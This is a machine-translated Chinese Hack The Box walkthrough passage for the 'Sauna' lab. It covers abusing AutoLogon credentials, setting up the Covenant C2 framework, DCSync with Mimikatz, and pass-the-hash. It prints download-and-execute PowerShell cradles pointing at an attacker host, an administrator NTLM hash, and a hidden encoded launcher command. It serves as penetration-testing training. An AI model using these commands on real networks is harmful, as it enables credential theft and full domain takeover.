gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi os"><img src="../Images/26ac790aa9284dc4d609c5aad5612d28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O09TAw_Oi5KGk9C4wbp9Mg.png"/></div></div></figure><p id="8195" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">一个值得注意的发现是留在WindowsAutoLogon上的凭证。这通常是一种错误的配置，因为它提供了便利。你可以在这里了解更多信息<a class="ae jy" href="https://support.microsoft.com/en-ph/help/324737/how-to-turn-on-automatic-logon-in-windows" rel="noopener ugc nofollow" target="_blank">。</a></p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/aeb668b46bd2bf8c0c8be79526817f5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*Vv6rPOPjiotE1UQBW5j8bA.png"/></div></figure><p id="e0fc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">微软提到这是一个安全风险:</p><blockquote class="ou ov ow"><p id="c8b3" class="jz ka ox kb b kc kd ke kf kg kh ki kj oy kl km kn oz kp kq kr pa kt ku kv kw ij bi translated">如果您将电脑设置为自动登录，任何可以实际访问该电脑的人都可以访问该电脑的所有内容，包括它所连接的任何网络。此外，当自动登录打开时，密码以纯文本形式存储在注册表中。Authenticated Users组可以远程读取存储该值的特定注册表项。只有在计算机受到物理保护并且已经采取措施确保不受信任的用户无法远程访问注册表的情况下，才建议使用此设置。</p></blockquote><p id="e6dc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我以<code class="fe mj mk ml mm b">svc_loanmgr</code>的身份登录到机器。然后我开始在盒子上装载<a class="ae jy" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" rel="noopener ugc nofollow" target="_blank"> Powerview </a>。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="11eb" class="kx ky iq mm b gy nm nn l no np">iex(new-object net.webclient).downloadString('<a class="ae jy" href="http://10.10.14.3:9000/1.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.3:9000/1.ps1'</a>)</span></pre><p id="8868" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还通过对<code class="fe mj mk ml mm b">svc_loanmgr</code>运行<code class="fe mj mk ml mm b">Get-DomainUser</code>来检查脚本是否正确加载:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="f7ab" class="kx ky iq mm b gy nm nn l no np">get-domainuser -identity svc_loanmgr</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pb"><img src="../Images/b0709f638c7d038ab51f7a911184e949.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U1rL8enD6dRS50B-LCO-3Q.png"/></div></div></figure><p id="5959" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">当我最初解决这个问题时，我使用了<code class="fe mj mk ml mm b">Bloodhound</code>，这将清楚地向您显示用户<code class="fe mj mk ml mm b">svc_loanmgr</code>可以<code class="fe mj mk ml mm b">DCSync</code>并获得域散列。但是为了这篇文章的目的和增加趣味，我将使用用<code class="fe mj mk ml mm b">C#</code>编写的C2框架<code class="fe mj mk ml mm b">Covenant</code>(这意味着它的移植只在Windows主机上工作)，因为关于如何设置它的文章很少，我还将演示它的基本功能。如果您在一个有成百上千台PC的真实环境中，您不能只使用netcat或Metasploit来捕获shell，因为随着您深入环境，shell和会话会变得更难管理。因此使用了C2框架。</p><h2 id="b564" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">使用契约:</h2><p id="9037" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">要使用Covenant，我需要首先从Github <a class="ae jy" href="https://github.com/cobbr/Covenant" rel="noopener ugc nofollow" target="_blank"> repo </a>中克隆它。安装步骤可以在<a class="ae jy" href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup" rel="noopener ugc nofollow" target="_blank">这里</a>找到。我会做第一个选择。克隆回购:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="bdf6" class="kx ky iq mm b gy nm nn l no np">git clone --recurse-submodules <a class="ae jy" href="https://github.com/cobbr/Covenant" rel="noopener ugc nofollow" target="_blank">https://github.com/cobbr/Covenant</a></span></pre><p id="5e8a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还需要下载dotnet。注意，下载回购中提到的dotnet具体版本。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/beb8b235bc181402a2066b8894c6361a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*zDMA3ZqVHfSOvyeIZaTxpA.png"/></div></figure><p id="f051" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">提取其内容后，我使其可执行，并使用<code class="fe mj mk ml mm b">dotnet build</code>构建契约。如果一切顺利，您应该看到构建成功了。然后我<code class="fe mj mk ml mm b">dotnet run </code>在圣约/圣约目录上启动圣约。默认情况下，它侦听端口7443。以提升的权限运行它也是理想的，这样您就可以为您的侦听器使用公共TCP端口。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pc"><img src="../Images/28dfa3ab91e4af46ff248c7ab099271a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SXMpZBGvNUe9QRz23GZzPA.png"/></div></div></figure><p id="8c9f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">访问https:// <yourip> :7443，它提示警告，因为Covenant使用自签名证书，这没问题:</yourip></p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pd"><img src="../Images/8b51861a6d759440deef2df3879e2fcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P1am4ZMCtKog2QQfPRpqUA.png"/></div></div></figure><p id="f951" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">接受后，需要注册一个初始用户。您可以稍后添加更多用户。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pe"><img src="../Images/997bf90b030fedda2ca44555c326f16d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1234/format:webp/1*Ciov30WOo2gEazD-S7pLJQ.png"/></div></div></figure><p id="f0d4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Covenant的仪表盘很简单。它显示你的<code class="fe mj mk ml mm b">Grunts</code>、<code class="fe mj mk ml mm b">Listeners</code>和<code class="fe mj mk ml mm b">Taskings</code>。咕噜声是您当前在受害者机器上运行的<code class="fe mj mk ml mm b">“implant”</code>。<code class="fe mj mk ml mm b">Listeners</code>是植入回调的地方，<code class="fe mj mk ml mm b">Taskings</code>是分配给<code class="fe mj mk ml mm b">Grunts</code>的命令或模块。我建议您阅读Github repo上的文档以了解更多详细信息。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pf"><img src="../Images/9a086af5df7e896f07570893768a2608.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XuHHFeKB3p0MDn33wo_g-w.png"/></div></div></figure><p id="6cec" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">第一步是创建一个监听器:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pg"><img src="../Images/bcd849abb36d2cc0e496656c05d7b025.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eIHHMvAMWLPcMQWksqB9Mg.png"/></div></div></figure><p id="dc60" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">按下create，我可以给我的监听器一个<code class="fe mj mk ml mm b">name</code>,这有助于识别哪个监听器用于什么。我还将连接地址设置为我的Hack the Box IP:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ph"><img src="../Images/28038bedd2ca3bc2f5a60713ff57a577.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5MQmDoDCi35AuaRGAbbYpQ.png"/></div></div></figure><p id="e28c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在看到有个听众叫桑拿，还是<code class="fe mj mk ml mm b">Uninitialized</code>。这是因为我将Covenant作为<code class="fe mj mk ml mm b">non-elevated user</code>运行，这阻止了Covenant使用端口80(一个公共端口)。如果我以提升用户的身份运行Covenant，或者选择一个更高的端口，那么状态将是<code class="fe mj mk ml mm b">Active</code>。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pi"><img src="../Images/7f80a7310235a3406ef3f27721bd0b95.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YDl9tG1oAbAZvaMGj0gHUQ.png"/></div></div></figure><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/5cc5f7c3b30a27e74d61d96541381b74.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/1*73gBb7-fpBqRxZuM69qXfQ.png"/></div></figure><p id="8796" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查我运行Covenant的终端，由于上面提到的原因，我看到“权限被拒绝”。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pk"><img src="../Images/2eb6e7fd3be2aa341dceaf64c8505499.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*26RDe-ypWTRo8a77DJsGrg.png"/></div></div></figure><p id="03d2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我故意这样做是为了演示在设置Covenant时可能出现的问题。这一次，我以提升的用户身份重新运行了Covenant，并在端口9000上创建了一个侦听器(在实际操作中，使用53、80或443等常见端口。但是要确保为HTTPs设置了可信证书)。看到状态是<code class="fe mj mk ml mm b">Active</code>。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pl"><img src="../Images/77d1dc47bb106db98e904f8779eb5c01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mwBT6aUUpl5kj-3X0A7lww.png"/></div></div></figure><p id="03f8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">既然我有了一个听众，下一步就是选择一个<code class="fe mj mk ml mm b">Launcher</code>。发射器是我用来发射咕噜声的。这可以通过以下各种方式实现:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pm"><img src="../Images/15780512e5e16a77a3b4860bbadd4a66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lPT-6ERX0P4qfMLz-rucgg.png"/></div></div></figure><p id="8c41" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">例如，我可以用一个二进制数<code class="fe mj mk ml mm b">Launcher</code>来启动一个<code class="fe mj mk ml mm b">Grunt</code>。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pn"><img src="../Images/c3b9523884623c38d41db5e95392439d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tYJozpnPBv93dFi5W7vOfw.png"/></div></div></figure><p id="02ba" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">选择“生成”以创建启动器:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi po"><img src="../Images/7ea8f2ef1a9d777c45392afeaec9f26c.png" data-original-src="https://miro.medium.com/v2/resize:fit:886/format:webp/1*x3b7DwEeyNThx5rerCtCHQ.png"/></div></figure><p id="ba15" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有多种方法可以将二进制启动器放在受害者盒子上。我可以下载二进制文件，然后通过HTTP或SMB或其他方式传输。我还可以重命名该文件:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pp"><img src="../Images/adf33b1755f72616f36fcf36028cda6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HDwUoPKRdhoL6PC-Mt7xoQ.png"/></div></div></figure><p id="2418" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还可以使用创建的侦听器来托管文件。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pq"><img src="../Images/a7f7ce02eb92c1e6eee7729e8bd8323e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*scVssbhZ6WB_9HFRcOBxow.png"/></div></div></figure><p id="18a0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">或者甚至检查所使用的代码，这可以方便地构建您自己的<code class="fe mj mk ml mm b">Grunts</code>以达到规避的目的。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pr"><img src="../Images/2d1061efc33bb7947fbf76c8fe099435.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4rqDPxIunkbohhyOn22l8Q.png"/></div></div></figure><p id="2f09" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我也可以使用PowerShell <code class="fe mj mk ml mm b">Launcher:</code>启动一个<code class="fe mj mk ml mm b">Grunt</code></p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ps"><img src="../Images/22ec2b2ec2e8038ff516f025fe4a31f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CrRkVDi5j_hJKHB-290Ykg.png"/></div></div></figure><p id="5802" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">按下generate，它创建两个PowerShell一行程序，其中一个是编码的。我可以把这个贴在我的受害者专栏上。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pt"><img src="../Images/b06b98e1c81ca32ab8691cddce59edad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tmQkJuAvVf9A0ETnvgevIQ.png"/></div></div></figure><p id="3627" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我用的是PowerShell启动器。现在，在我的圣约人仪表盘上，我收到了一个咕噜人已被激活的通知:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi pu"><img src="../Images/0701c295cc79369e82ab375602e9a7c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:648/format:webp/1*FzhzRCP7XOmAFvmPcsuXsw.png"/></div></figure><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pv"><img src="../Images/4f186330d5f1117778ed554d84e0cc8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tuJwNFHONJmPzwloSzzzXg.png"/></div></div></figure><p id="76d5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查<code class="fe mj mk ml mm b">Grunt</code>的属性，它显示有用的信息，如域名、当前用户、主机名、IP地址、Windows版本和时间细节。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pw"><img src="../Images/f0ad432eeb3b2dacef5a445b829207c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dXNZsJb1kn15nLbTdhDcmg.png"/></div></div></figure><p id="b770" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">选择一个任务后，会出现各种选项卡，如信息、交互、任务和任务。信息就是我上面显示的。</p><p id="3c36" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Interact是一个终端，可以用来与Grunt交互。例如，使用<code class="fe mj mk ml mm b">ShellCmd</code>任务，我可以运行<code class="fe mj mk ml mm b">whoami</code>:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi px"><img src="../Images/00b05e1f2c3b0266b829379bb9342fa4.png" data-original-src="https://miro.medium.com/v2/resize:fit:584/format:webp/1*X-kwk3LUBA65AFzRGcJBug.png"/></div></figure><p id="3115" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">任务是交互的“GUI”版本:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi py"><img src="../Images/030632a775591a42ccd8ebce4db8226d.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/1*ybYEoyYLruPDK6TNVhyGhw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">工作</figcaption></figure><p id="9aa4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">最后是Taskings(由我在下面运行的任务填充),它列出了分配给这个任务的所有任务:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pz"><img src="../Images/a7073fe8ffb4c651642733da6f9864b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wa7h3HWRTVhlifijvhO_Dg.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">任务选项卡</figcaption></figure><p id="bbac" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我可以给士兵一个任务，你有很多选择，我会让你自己去探索。安全带在这里也是可用的，所以我运行相同的命令“-group=all”。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/cf08474431adb837a8c1969341657283.png" data-original-src="https://miro.medium.com/v2/resize:fit:994/format:webp/1*xkNPMYCVa6gTw4DuNRzpRg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">任务选项卡</figcaption></figure><p id="ef0f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以在Taskings下选择一个特定的任务，并查看其状态或输出。这也反映在交互选项卡中。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qb"><img src="../Images/25bf2322ef1cb21d4b3ed5a7514003a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IpepMYgtdJ8F3DtdKKZtfg.png"/></div></div></figure><p id="d31a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我启动另一个<code class="fe mj mk ml mm b">Grunt</code>，这一次是在我的<code class="fe mj mk ml mm b">WinRM</code>会话中作为s <code class="fe mj mk ml mm b">vc_loanmgr</code>。我得到一个回调，我可以看到我有两个<code class="fe mj mk ml mm b">Grunts</code>:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qc"><img src="../Images/aa40f35f16cfa2f856b173aa13986057.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yl3Z_DolrDf33uUI9qw8Pg.png"/></div></div></figure><p id="1128" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">使用C2的一个优点是我可以通过Grunt导入PowerShell脚本。我可以分配一个名为“PowerShellImport”的任务。在这种情况下，我将导入Powerview。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/0a95aa72b225bec67dfb466fc32b6f93.png" data-original-src="https://miro.medium.com/v2/resize:fit:962/format:webp/1*s99jXYajP0l7IUUQWNhmMA.png"/></div></figure><p id="f399" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还可以托管任何文件，在本例中是文件名为1.ps1的Powerview。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/42f10b434bf640bb595dd093e380554d.png" data-original-src="https://miro.medium.com/v2/resize:fit:878/format:webp/1*PqbAhetdA_v8z-3_WPm1Rw.png"/></div></figure><p id="6c1d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">按下create后，它生成一个PowerShell一行程序，使用著名的iex(Invoke-Expression)将脚本加载到内存中。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qf"><img src="../Images/25de83f9d4438268ae317e6d0f8481ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qhOXfR_qnZqLX0ygoqDUiw.png"/></div></div></figure><p id="4fa9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我之前已经知道<code class="fe mj mk ml mm b">svc_loanmgr</code>拥有<code class="fe mj mk ml mm b">DCSync</code>权限，所以我可以为我的Grunt分配一个任务来使用DCSync，它使用Mimikatz二进制文件。不需要在系统上删除Mimikatz二进制文件或加载Invoke-Mimikatz！</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qg"><img src="../Images/c4f427f2c71380326f3a16668491388e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aBvFA9TUT1YK1dTLVwEtQQ.png"/></div></div></figure><p id="d0c0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我看到管理员哈希:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi qh"><img src="../Images/ecf6e55601ccf0c7016bb713726b7b07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1054/format:webp/1*Q6uz8saJ-vd26KI-JzTvlg.png"/></div></figure><p id="2ee8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Covenant的另一个很酷的特性是，它可以存储使用Grunts收集的凭证，还可以列出在实际参与中有帮助的指标。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi pr"><img src="../Images/a6113de9e5f0c21f5b77924d54eb22f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PGE8CeijGyVJ5JnsHgiNYw.png"/></div></div></figure><p id="c2e2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在我有了管理员的散列，我可以传递散列了。我使用cme执行PowerShell命令，这是一个编码的PowerShell启动器:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="4fbf" class="kx ky iq mm b gy nm nn l no np">sudo /opt/cme smb 10.10.10.175 -d egotistical-bank.local -u administrator -H 'd9485863c1e9e05851aa40cbb4ab9dff' -X "powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwA6ADkAMAAwADAALwBhAC4AcABzADEAJwApAA=="</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qi"><img src="../Images/c59f62a69edd43505f86d0531e807f06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CymBbEXlAAVzLeDF-8dNOA.png"/></div></div></figure><p id="bfd2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我收到一个通知，通知我一个<code class="fe mj mk ml mm b">Grunt</code>被激活:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi qj"><img src="../Images/00d10247982947753960639232c8d593.png" data-original-src="https://miro.medium.com/v2/resize:fit:646/format:webp/1*KJdu_pxrtBa-WaapP6tccA.png"/></div></figure><p id="59ec" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查我的<code class="fe mj mk ml mm b">Grunts</code>:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi qk"><img src="../Images/fd409c0ff0953c83ce3914efbb25652b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7rvD2CurGhnbEukgUJhV9g.png"/></div></div></figure><p id="fc82" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我与作为管理员运行的Grunt进行交互，并从那里读取标志。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi ql"><img src="../Images/555614c5b07b5c07924b3772a72a5e60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1048/format:webp/1*sFTn65vzzh7bADDbqMECPA.png"/></div></figure><p id="8975" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我的文章到此结束。我希望你学到了新的东西！感谢阅读！🍺</p></div></div>    
</body>
</html>